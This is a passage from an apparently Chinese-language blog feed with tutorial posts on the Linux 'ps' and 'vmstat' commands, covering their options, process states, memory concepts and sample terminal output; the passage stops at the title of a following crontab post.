    <content type="text"><![CDATA[Linux 命令- ps&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux中的ps命令是Process Status的缩写。ps命令用来列出系统中当前运行的那些进程。ps命令列出的是当前那些进程的快照，就是执行ps命令的那个时刻的那些进程，如果想要动态的显示进程信息，就可以使用top命令。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;要对进程进行监测和控制，首先必须要了解当前进程的情况，也就是需要查看当前进程，而 ps 命令就是最基本同时也是非常强大的进程查看命令。使用该命令可以确定有哪些进程正在运行和运行的状态、进程是否结束、进程有没有僵死、哪些进程占用了过多的资源等等。总之大部分信息都是可以通过执行该命令得到的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ps 为我们提供了进程的一次性的查看，它所提供的查看结果并不动态连续的；如果想对进程时间监控，应该用 top 工具。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;kill 命令用于杀死进程。 inux上进程有5种状态: 运行(正在运行或在运行队列中等待) 中断(休眠中, 受阻, 在等待某个条件的形成或接受到信号) 不可中断(收到信号不唤醒和不可运行, 进程必须等待直到有中断发生) 僵死(进程已终止, 但进程描述符存在, 直到父进程调用wait4()系统调用后释放) 停止(进程收到SIGSTOP, SIGSTP, SIGTIN, SIGTOU信号后停止运行运行) ps工具标识进程的5种状态码: D 不可中断 uninterruptible sleep (usually IO) R 运行 runnable (on run queue) S 中断 sleeping T 停止 traced or stopped Z 僵死 a defunct (”zombie”) process 1．命令格式1ps[参数] 2．命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用来显示当前进程的状态 3．命令参数 a 显示所有进程 -a 显示同一终端下的所有程序 -A 显示所有进程 c 显示进程的真实名称 -N 反向选择 -e 等于“-A” e 显示环境变量 f 显示程序间的关系 -H 显示树状结构 r 显示当前终端的进程 T 显示当前终端的所有程序 u 指定用户的所有进程 -au 显示较详细的资讯 -aux 显示所有包含其他使用者的行程 -C&lt;命令&gt; 列出指定命令的状况 –lines&lt;行数&gt; 每页显示的行数 –width&lt;字符数&gt; 每页显示的字符数 –help 显示帮助信息 –version 显示版本显示 4．使用实例实例1：显示所有进程信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ps -A &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516[root@localhost test6]# ps -A PID TTY TIME CMD 1 ? 00:00:00 init 2 ? 00:00:01 migration/0 3 ? 00:00:00 ksoftirqd/0 4 ? 00:00:01 migration/1 5 ? 00:00:00 ksoftirqd/1 6 ? 00:29:57 events/0 7 ? 00:00:00 events/1 8 ? 00:00:00 khelper 49 ? 00:00:00 kthread 54 ? 00:00:00 kblockd/0 55 ? 00:00:00 kblockd/1 56 ? 00:00:00 kacpid 217 ? 00:00:00 cqueue/0 ……省略部分结果 实例2：显示指定用户信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ps -u root &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112131415[root@localhost test6]# ps -u root PID TTY TIME CMD 1 ? 00:00:00 init 2 ? 00:00:01 migration/0 3 ? 00:00:00 ksoftirqd/0 4 ? 00:00:01 migration/1 5 ? 00:00:00 ksoftirqd/1 6 ? 00:29:57 events/0 7 ? 00:00:00 events/1 8 ? 00:00:00 khelper 49 ? 00:00:00 kthread 54 ? 00:00:00 kblockd/0 55 ? 00:00:00 kblockd/1 56 ? 00:00:00 kacpid ……省略部分结果 实例3：显示所有进程信息，连同命令行&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ps -ef &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112131415[root@localhost test6]# ps -efUID PID PPID C STIME TTY TIME CMDroot 1 0 0 Nov02 ? 00:00:00 init [3] root 2 1 0 Nov02 ? 00:00:01 [migration/0]root 3 1 0 Nov02 ? 00:00:00 [ksoftirqd/0]root 4 1 0 Nov02 ? 00:00:01 [migration/1]root 5 1 0 Nov02 ? 00:00:00 [ksoftirqd/1]root 6 1 0 Nov02 ? 00:29:57 [events/0]root 7 1 0 Nov02 ? 00:00:00 [events/1]root 8 1 0 Nov02 ? 00:00:00 [khelper]root 49 1 0 Nov02 ? 00:00:00 [kthread]root 54 49 0 Nov02 ? 00:00:00 [kblockd/0]root 55 49 0 Nov02 ? 00:00:00 [kblockd/1]root 56 49 0 Nov02 ? 00:00:00 [kacpid]……省略部分结果 实例4： ps 与grep 常用组合用法，查找特定进程&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ps -ef|grep ssh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234[root@localhost test6]# ps -ef|grep sshroot 2720 1 0 Nov02 ? 00:00:00 /usr/sbin/sshdroot 17394 2720 0 14:58 ? 00:00:00 sshd: root@pts/0 root 17465 17398 0 15:57 pts/0 00:00:00 grep ssh 实例5：将目前属于您自己这次登入的 PID 与相关信息列示出来&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ps -l &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234[root@localhost test6]# ps -lF S UID PID PPID C PRI NI ADDR SZ WCHAN TTY TIME CMD4 S 0 17398 17394 0 75 0 - 16543 wait pts/0 00:00:00 bash4 R 0 17469 17398 0 77 0 - 15877 - pts/0 00:00:00 ps &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;各相关信息的意义： F 代表这个程序的旗标 (flag)， 4 代表使用者为 super user S 代表这个程序的状态 (STAT)，关于各 STAT 的意义将在内文介绍 UID 程序被该 UID 所拥有 PID 就是这个程序的 ID ！ PPID 则是其上级父程序的ID C CPU 使用的资源百分比 PRI 这个是 Priority (优先执行序) 的缩写 NI 这个是 Nice 值，在下一小节我们会持续介绍 ADDR 这个是 kernel function，指出该程序在内存的那个部分。如果是个 running的程序，一般就是 “-“ SZ 使用掉的内存大小 WCHAN 目前这个程序是否正在运作当中，若为 - 表示正在运作 TTY 登入者的终端机位置 TIME 使用掉的 CPU 时间。 CMD 所下达的指令为何 在预设的情况下， ps 仅会列出与目前所在的 bash shell 有关的 PID 而已，所以， 当我使用 ps -l 的时候，只有三个 PID。 实例6：列出目前所有的正在内存当中的程序&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ps aux &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112131415[root@localhost test6]# ps auxUSER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMANDroot 1 0.0 0.0 10368 676 ? Ss Nov02 0:00 init [3] root 2 0.0 0.0 0 0 ? S&lt; Nov02 0:01 [migration/0]root 3 0.0 0.0 0 0 ? SN Nov02 0:00 [ksoftirqd/0]root 4 0.0 0.0 0 0 ? S&lt; Nov02 0:01 [migration/1]root 5 0.0 0.0 0 0 ? SN Nov02 0:00 [ksoftirqd/1]root 6 0.0 0.0 0 0 ? S&lt; Nov02 29:57 [events/0]root 7 0.0 0.0 0 0 ? S&lt; Nov02 0:00 [events/1]root 8 0.0 0.0 0 0 ? S&lt; Nov02 0:00 [khelper]root 49 0.0 0.0 0 0 ? S&lt; Nov02 0:00 [kthread]root 54 0.0 0.0 0 0 ? S&lt; Nov02 0:00 [kblockd/0]root 55 0.0 0.0 0 0 ? S&lt; Nov02 0:00 [kblockd/1]root 56 0.0 0.0 0 0 ? S&lt; Nov02 0:00 [kacpid]……省略部分结果 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 USER：该 process 属于那个使用者账号的 PID ：该 process 的号码 %CPU：该 process 使用掉的 CPU 资源百分比 %MEM：该 process 所占用的物理内存百分比 VSZ ：该 process 使用掉的虚拟内存量 (Kbytes) RSS ：该 process 占用的固定的内存量 (Kbytes) TTY ：该 process 是在那个终端机上面运作，若与终端机无关，则显示 ?，另外， tty1-tty6 是本机上面的登入者程序，若为 pts/0 等等的，则表示为由网络连接进主机的程序。 STAT：该程序目前的状态，主要的状态有 R ：该程序目前正在运作，或者是可被运作 S ：该程序目前正在睡眠当中 (可说是 idle 状态)，但可被某些讯号 (signal) 唤醒。 T ：该程序目前正在侦测或者是停止了 Z ：该程序应该已经终止，但是其父程序却无法正常的终止他，造成 zombie (疆尸) 程序的状态 START：该 process 被触发启动的时间 TIME ：该 process 实际使用 CPU 运作的时间 COMMAND：该程序的实际指令 实例7：列出类似程序树的程序显示&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ps -axjf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;*输出 123456789101112131415[root@localhost test6]# ps -axjfWarning: bad syntax, perhaps a bogus '-'? See /usr/share/doc/procps-3.2.7/FAQ PPID PID PGID SID TTY TPGID STAT UID TIME COMMAND 0 1 1 1 ? -1 Ss 0 0:00 init [3] 1 2 1 1 ? -1 S&lt; 0 0:01 [migration/0] 1 3 1 1 ? -1 SN 0 0:00 [ksoftirqd/0] 1 4 1 1 ? -1 S&lt; 0 0:01 [migration/1] 1 5 1 1 ? -1 SN 0 0:00 [ksoftirqd/1] 1 6 1 1 ? -1 S&lt; 0 29:58 [events/0] 1 7 1 1 ? -1 S&lt; 0 0:00 [events/1] 1 8 1 1 ? -1 S&lt; 0 0:00 [khelper] 1 49 1 1 ? -1 S&lt; 0 0:00 [kthread] 49 54 1 1 ? -1 S&lt; 0 0:00 \_ [kblockd/0] 49 55 1 1 ? -1 S&lt; 0 0:00 \_ [kblockd/1] 49 56 1 1 ? -1 S&lt; 0 0:00 \_ [kacpid] 实例8：找出与 cron 与 syslog 这两个服务有关的 PID 号码&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1pa aux|egrep '(cron|syslog)' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345[root@localhost test6]# ps aux | egrep '(cron|syslog)'root 2682 0.0 0.0 83384 2000 ? Sl Nov02 0:00 /sbin/rsyslogd -i /var/run/syslogd.pid -c 5root 2735 0.0 0.0 74812 1140 ? Ss Nov02 0:00 crondroot 17475 0.0 0.0 61180 832 pts/0 S+ 16:27 0:00 egrep (cron|syslog)[root@localhost test6]# 其他实例：1. 可以用 | 管道和 more 连接起来分页查看&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ps -aux |more 2. 把所有进程显示出来，并输出到ps001.txt文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ps -aux &gt; ps001.txt 3. 输出指定的字段&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ps -o pid,ppid,pgrp,session,tpgid,comm &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345[root@localhost test6]# ps -o pid,ppid,pgrp,session,tpgid,comm PID PPID PGRP SESS TPGID COMMAND17398 17394 17398 17398 17478 bash17478 17398 17478 17398 17478 ps[root@localhost test6]#]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- vmstat]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F48.%20Linux%20%E5%91%BD%E4%BB%A4-%20vmstat%2F</url>
    <content type="text"><![CDATA[Linux 命令- vmstat&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;vmstat是Virtual Meomory Statistics（虚拟内存统计）的缩写，可对操作系统的虚拟内存、进程、CPU活动进行监控。他是对系统的整体情况进行统计，不足之处是无法对某个进程进行深入分析。vmstat 工具提供了一种低开销的系统性能观察方式。因为 vmstat 本身就是低开销工具，在非常高负荷的服务器上，你需要查看并监控系统的健康情况,在控制窗口还是能够使用vmstat 输出结果。在学习vmstat命令前，我们先了解一下Linux系统中关于物理内存和虚拟内存相关信息。 物理内存和虚拟内存区别：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;我们知道，直接从物理内存读写数据要比从硬盘读写数据要快的多，因此，我们希望所有数据的读取和写入都在内存完成，而内存是有限的，这样就引出了物理内存与虚拟内存的概念。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;物理内存就是系统硬件提供的内存大小，是真正的内存，相对于物理内存，在linux下还有一个虚拟内存的概念，虚拟内存就是为了满足物理内存的不足而提出的策略，它是利用磁盘空间虚拟出的一块逻辑内存，用作虚拟内存的磁盘空间被称为交换空间（Swap Space）。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;作为物理内存的扩展，linux会在物理内存不足时，使用交换分区的虚拟内存，更详细的说，就是内核会将暂时不用的内存块信息写到交换空间，这样以来，物理内存得到了释放，这块内存就可以用于其它目的，当需要用到原始的内容时，这些信息会被重新从交换空间读入物理内存。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;linux的内存管理采取的是分页存取机制，为了保证物理内存能得到充分的利用，内核会在适当的时候将物理内存中不经常使用的数据块自动交换到虚拟内存中，而将经常使用的信息保留到物理内存。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;要深入了解linux内存运行机制，需要知道下面提到的几个方面： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先，Linux系统会不时的进行页面交换操作，以保持尽可能多的空闲物理内存，即使并没有什么事情需要内存，Linux也会交换出暂时不用的内存页面。这可以避免等待交换所需的时间。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其次，linux进行页面交换是有条件的，不是所有页面在不用时都交换到虚拟内存，linux内核根据”最近最经常使用“算法，仅仅将一些不经常使用的页面文件交换到虚拟内存，有时我们会看到这么一个现象：linux物理内存还有很多，但是交换空间也使用了很多。其实，这并不奇怪，例如，一个占用很大内存的进程运行时，需要耗费很多内存资源，此时就会有一些不常用页面文件被交换到虚拟内存中，但后来这个占用很多内存资源的进程结束并释放了很多内存时，刚才被交换出去的页面文件并不会自动的交换进物理内存，除非有这个必要，那么此刻系统物理内存就会空闲很多，同时交换空间也在被使用，就出现了刚才所说的现象了。关于这点，不用担心什么，只要知道是怎么一回事就可以了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;最后，交换空间的页面在使用时会首先被交换到物理内存，如果此时没有足够的物理内存来容纳这些页面，它们又会被马上交换出去，如此以来，虚拟内存中可能没有足够空间来存储这些交换页面，最终会导致linux出现假死机、服务异常等问题，linux虽然可以在一段时间内自行恢复，但是恢复后的系统已经基本不可用了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;因此，合理规划和设计linux内存的使用，是非常重要的。 虚拟内存原理：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在系统中运行的每个进程都需要使用到内存，但不是每个进程都需要每时每刻使用系统分配的内存空间。当系统运行所需内存超过实际的物理内存，内核会释放某些进程所占用但未使用的部分或所有物理内存，将这部分资料存储在磁盘上直到进程下一次调用，并将释放出的内存提供给有需要的进程使用。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在Linux内存管理中，主要是通过“调页Paging”和“交换Swapping”来完成上述的内存调度。调页算法是将内存中最近不常使用的页面换到磁盘上，把活动页面保留在内存中供进程使用。交换技术是将整个进程，而不是部分页面，全部交换到磁盘上。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;分页(Page)写入磁盘的过程被称作Page-Out，分页(Page)从磁盘重新回到内存的过程被称作Page-In。当内核需要一个分页时，但发现此分页不在物理内存中(因为已经被Page-Out了)，此时就发生了分页错误（Page Fault）。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当系统内核发现可运行内存变少时，就会通过Page-Out来释放一部分物理内存。经管Page-Out不是经常发生，但是如果Page-out频繁不断的发生，直到当内核管理分页的时间超过运行程式的时间时，系统效能会急剧下降。这时的系统已经运行非常慢或进入暂停状态，这种状态亦被称作thrashing(颠簸)。 1．命令格式1234567vmstat [-a] [-n] [-S unit] [delay [ count]]vmstat [-s] [-n] [-S unit]vmstat [-m] [-n] [delay [ count]]vmstat [-d] [-n] [delay [ count]]vmstat [-p disk partition] [-n] [delay [ count]]vmstat [-f]vmstat [-V] 2．命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用来显示虚拟内存的信息 3．命令参数 -a：显示活跃和非活跃内存 -f：显示从系统启动至今的fork数量 。 -m：显示slabinfo -n：只在开始时显示一次各字段名称。 -s：显示内存相关统计信息及多种系统活动数量。 delay：刷新时间间隔。如果不指定，只显示一条结果。 count：刷新次数。如果不指定刷新次数，但指定了刷新时间间隔，这时刷新次数为无穷。 -d：显示磁盘相关统计信息。 -p：显示指定磁盘分区统计信息 -S：使用指定单位显示。参数有 k 、K 、m 、M ，分别代表1000、1024、1000000、1048576字节（byte）。默认单位为K（1024 bytes） -V：显示vmstat版本信息。 4．使用实例实例1：显示虚拟内存使用情况&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1vmstat &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789[root@localhost ~]# vmstat 5 6procs -----------memory---------- ---swap-- -----io---- --system-- -----cpu------ r b swpd free buff cache si so bi bo in cs us sy id wa st 0 0 0 3029876 199616 690980 0 0 0 2 3 2 0 0 100 0 0 0 0 0 3029752 199616 690980 0 0 0 41 1009 39 0 0 100 0 0 0 0 0 3029752 199616 690980 0 0 0 3 1004 36 0 0 100 0 0 0 0 0 3029752 199616 690980 0 0 0 4 1004 36 0 0 100 0 0 0 0 0 3029752 199616 690980 0 0 0 6 1003 33 0 0 100 0 0 0 0 0 3029752 199616 690980 0 0 0 5 1003 33 0 0 100 0 0 说明：字段说明：Procs（进程）： r: 运行队列中进程数量 b: 等待IO的进程数量 Memory（内存）： swpd: 使用虚拟内存大小 free: 可用内存大小 buff: 用作缓冲的内存大小 cache: 用作缓存的内存大小 Swap： si: 每秒从交换区写到内存的大小 so: 每秒写入交换区的内存大小 IO：（现在的Linux版本块的大小为1024bytes） bi: 每秒读取的块数 bo: 每秒写入的块数 系统： in: 每秒中断数，包括时钟中断。 cs: 每秒上下文切换数。 CPU（以百分比表示）： us: 用户进程执行时间(user time) sy: 系统进程执行时间(system time) id: 空闲时间(包括IO等待时间),中央处理器的空闲时间 。以百分比表示。 wa: 等待IO时间 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;备注： 如果 r经常大于 4 ，且id经常少于40，表示cpu的负荷很重。如果bi，bo 长期不等于0，表示内存不足。如果disk 经常不等于0， 且在 b中的队列 大于3， 表示 io性能不好。Linux在具有高稳定性、可靠性的同时，具有很好的可伸缩性和扩展性，能够针对不同的应用和硬件环境调整，优化出满足当前应用需要的最佳性能。因此企业在维护Linux系统、进行系统调优时，了解系统性能分析工具是至关重要的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1vmstat 5 5 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;表示在5秒时间内进行5次采样。将得到一个数据汇总他能够反映真正的系统情况。 实例2：显示活跃和非活跃内存&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1vmstat -a 2 5 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789[root@localhost ~]# vmstat -a 2 5procs -----------memory---------- ---swap-- -----io---- --system-- -----cpu------ r b swpd free inact active si so bi bo in cs us sy id wa st 0 0 0 3029752 387728 513008 0 0 0 2 3 2 0 0 100 0 0 0 0 0 3029752 387728 513076 0 0 0 0 1005 34 0 0 100 0 0 0 0 0 3029752 387728 513076 0 0 0 22 1004 36 0 0 100 0 0 0 0 0 3029752 387728 513076 0 0 0 0 1004 33 0 0 100 0 0 0 0 0 3029752 387728 513076 0 0 0 0 1003 32 0 0 100 0 0[root@localhost ~]# 说明&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用-a选项显示活跃和非活跃内存时，所显示的内容除增加inact和active外，其他显示内容与例子1相同。 字段说明：Memory（内存）： inact: 非活跃内存大小（当使用-a选项时显示） active: 活跃的内存大小（当使用-a选项时显示） 实例3：查看系统已经fork了多少次&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1vmstat -f &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123[root@SCF1129 ~]# vmstat -f 12744849 forks[root@SCF1129 ~]# 说明：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个数据是从/proc/stat中的processes字段里取得的 实例4：查看内存使用的详细信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1vmstat -s &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112131415161718192021222324252627[root@localhost ~]# vmstat -s 4043760 total memory 1013884 used memory 513012 active memory 387728 inactive memory 3029876 free memory 199616 buffer memory 690980 swap cache 6096656 total swap 0 used swap 6096656 free swap 83587 non-nice user cpu ticks 132 nice user cpu ticks 278599 system cpu ticks 913344692 idle cpu ticks 814550 IO-wait cpu ticks 10547 IRQ cpu ticks 21261 softirq cpu ticks 0 stolen cpu ticks 310215 pages paged in 14254652 pages paged out 0 pages swapped in 0 pages swapped out 288374745 interrupts 146680577 CPU context switches 1351868832 boot time 367291 forks 说明&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这些信息的分别来自于/proc/meminfo,/proc/stat和/proc/vmstat。 实例5：查看磁盘的读/写&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1vmstat -d &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112131415161718192021222324[root@localhost ~]# vmstat -ddisk- ------------reads------------ ------------writes----------- -----IO------ total merged sectors ms total merged sectors ms cur secram0 0 0 0 0 0 0 0 0 0 0ram1 0 0 0 0 0 0 0 0 0 0ram2 0 0 0 0 0 0 0 0 0 0ram3 0 0 0 0 0 0 0 0 0 0ram4 0 0 0 0 0 0 0 0 0 0ram5 0 0 0 0 0 0 0 0 0 0ram6 0 0 0 0 0 0 0 0 0 0ram7 0 0 0 0 0 0 0 0 0 0ram8 0 0 0 0 0 0 0 0 0 0ram9 0 0 0 0 0 0 0 0 0 0ram10 0 0 0 0 0 0 0 0 0 0ram11 0 0 0 0 0 0 0 0 0 0ram12 0 0 0 0 0 0 0 0 0 0ram13 0 0 0 0 0 0 0 0 0 0ram14 0 0 0 0 0 0 0 0 0 0ram15 0 0 0 0 0 0 0 0 0 0sda 33381 6455 615407 63224 2068111 1495416 28508288 15990289 0 10491hdc 0 0 0 0 0 0 0 0 0 0fd0 0 0 0 0 0 0 0 0 0 0md0 0 0 0 0 0 0 0 0 0 0[root@localhost ~]# 说明&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这些信息主要来自于/proc/diskstats. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;merged:表示一次来自于合并的写/读请求,一般系统会把多个连接/邻近的读/写请求合并到一起来操作. 实例6：查看/dev/sda1磁盘的读/写&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1vmstat -p /dev/sda1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789[root@SCF1129 ~]# df文件系统 1K-块 已用 可用 已用% 挂载点/dev/sda3 1119336548 27642068 1034835500 3% /tmpfs 32978376 0 32978376 0% /dev/shm/dev/sda1 1032088 59604 920056 7% /boot[root@SCF1129 ~]# vmstat -p /dev/sda1sda1 reads read sectors writes requested writes 18607 4249978 6 48[root@SCF1129 ~]# vmstat -p /dev/sda3sda3 reads read sectors writes requested writes 429350 35176268 28998789 980301488[root@SCF1129 ~]# 说明&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这些信息主要来自于/proc/diskstats。 reads:来自于这个分区的读的次数。 read sectors:来自于这个分区的读扇区的次数。 writes:来自于这个分区的写的次数。 requested writes:来自于这个分区的写请求次数。 实例7：查看系统的slab信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1vmstat -m &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143[root@localhost ~]# vmstat -mCache Num Total Size Pagesip_conntrack_expect 0 0 136 28ip_conntrack 3 13 304 13ip_fib_alias 11 59 64 59ip_fib_hash 11 59 64 59AF_VMCI 0 0 960 4bio_map_info 100 105 1064 7dm_mpath 0 0 1064 7jbd_4k 0 0 4096 1dm_uevent 0 0 2608 3dm_tio 0 0 24 144dm_io 0 0 48 77scsi_cmd_cache 10 10 384 10sgpool-128 32 32 4096 1sgpool-64 32 32 2048 2sgpool-32 32 32 1024 4sgpool-16 32 32 512 8sgpool-8 45 45 256 15scsi_io_context 0 0 112 34ext3_inode_cache 51080 51105 760 5ext3_xattr 36 88 88 44journal_handle 18 144 24 144journal_head 56 80 96 40revoke_table 4 202 16 202revoke_record 0 0 32 112uhci_urb_priv 0 0 56 67UNIX 13 33 704 11flow_cache 0 0 128 30msi_cache 33 59 64 59cfq_ioc_pool 14 90 128 30cfq_pool 12 90 216 18crq_pool 16 96 80 48deadline_drq 0 0 80 48as_arq 0 0 96 40mqueue_inode_cache 1 4 896 4isofs_inode_cache 0 0 608 6hugetlbfs_inode_cache 1 7 576 7Cache Num Total Size Pagesext2_inode_cache 0 0 720 5ext2_xattr 0 0 88 44dnotify_cache 0 0 40 92dquot 0 0 256 15eventpoll_pwq 3 53 72 53eventpoll_epi 3 20 192 20inotify_event_cache 0 0 40 92inotify_watch_cache 1 53 72 53kioctx 0 0 320 12kiocb 0 0 256 15fasync_cache 0 0 24 144shmem_inode_cache 254 290 768 5posix_timers_cache 0 0 128 30uid_cache 0 0 128 30ip_mrt_cache 0 0 128 30tcp_bind_bucket 3 112 32 112inet_peer_cache 0 0 128 30secpath_cache 0 0 64 59xfrm_dst_cache 0 0 384 10ip_dst_cache 5 10 384 10arp_cache 1 15 256 15RAW 3 5 768 5UDP 5 10 768 5tw_sock_TCP 0 0 192 20request_sock_TCP 0 0 128 30TCP 4 5 1600 5blkdev_ioc 14 118 64 59blkdev_queue 20 30 1576 5blkdev_requests 13 42 272 14biovec-256 7 7 4096 1biovec-128 7 8 2048 2biovec-64 7 8 1024 4biovec-16 7 15 256 15biovec-4 7 59 64 59biovec-1 23 202 16 202bio 270 270 128 30utrace_engine_cache 0 0 64 59Cache Num Total Size Pagesutrace_cache 0 0 64 59sock_inode_cache 33 48 640 6skbuff_fclone_cache 7 7 512 7skbuff_head_cache 319 390 256 15file_lock_cache 1 22 176 22Acpi-Operand 4136 4248 64 59Acpi-ParseExt 0 0 64 59Acpi-Parse 0 0 40 92Acpi-State 0 0 80 48Acpi-Namespace 2871 2912 32 112delayacct_cache 81 295 64 59taskstats_cache 4 53 72 53proc_inode_cache 1427 1440 592 6sigqueue 0 0 160 24radix_tree_node 13166 13188 536 7bdev_cache 23 24 832 4sysfs_dir_cache 5370 5412 88 44mnt_cache 26 30 256 15inode_cache 2009 2009 560 7dentry_cache 60952 61020 216 18filp 479 1305 256 15names_cache 3 3 4096 1avc_node 14 53 72 53selinux_inode_security 994 1200 80 48key_jar 2 20 192 20idr_layer_cache 74 77 528 7buffer_head 164045 164800 96 40mm_struct 51 56 896 4vm_area_struct 1142 1958 176 22fs_cache 35 177 64 59files_cache 36 55 768 5signal_cache 72 162 832 9sighand_cache 68 84 2112 3task_struct 76 80 1888 2anon_vma 458 864 24 144pid 83 295 64 59shared_policy_node 0 0 48 77Cache Num Total Size Pagesnuma_policy 37 144 24 144size-131072(DMA) 0 0 131072 1size-131072 0 0 131072 1size-65536(DMA) 0 0 65536 1size-65536 1 1 65536 1size-32768(DMA) 0 0 32768 1size-32768 2 2 32768 1size-16384(DMA) 0 0 16384 1size-16384 5 5 16384 1size-8192(DMA) 0 0 8192 1size-8192 7 7 8192 1size-4096(DMA) 0 0 4096 1size-4096 110 111 4096 1size-2048(DMA) 0 0 2048 2size-2048 602 602 2048 2size-1024(DMA) 0 0 1024 4size-1024 344 352 1024 4size-512(DMA) 0 0 512 8size-512 433 480 512 8size-256(DMA) 0 0 256 15size-256 1139 1155 256 15size-128(DMA) 0 0 128 30size-64(DMA) 0 0 64 59size-64 5639 5782 64 59size-32(DMA) 0 0 32 112size-128 801 930 128 30size-32 3005 3024 32 112kmem_cache 137 137 2688 1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这组信息来自于/proc/slabinfo。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;slab:由于内核会有许多小对象，这些对象构造销毁十分频繁，比如i-node，dentry，这些对象如果每次构建的时候就向内存要一个页(4kb)，而其实只有几个字节，这样就会非常浪费，为了解决这个问题，就引入了一种新的机制来处理在同一个页框中如何分配小存储区，而slab可以对小对象进行分配,这样就不用为每一个对象分配页框，从而节省了空间，内核对一些小对象创建析构很频繁，slab对这些小对象进行缓冲,可以重复利用,减少内存分配次数。]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- crontab]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F52.%20Linux%20%E5%91%BD%E4%BB%A4-%20crontab%2F</url>
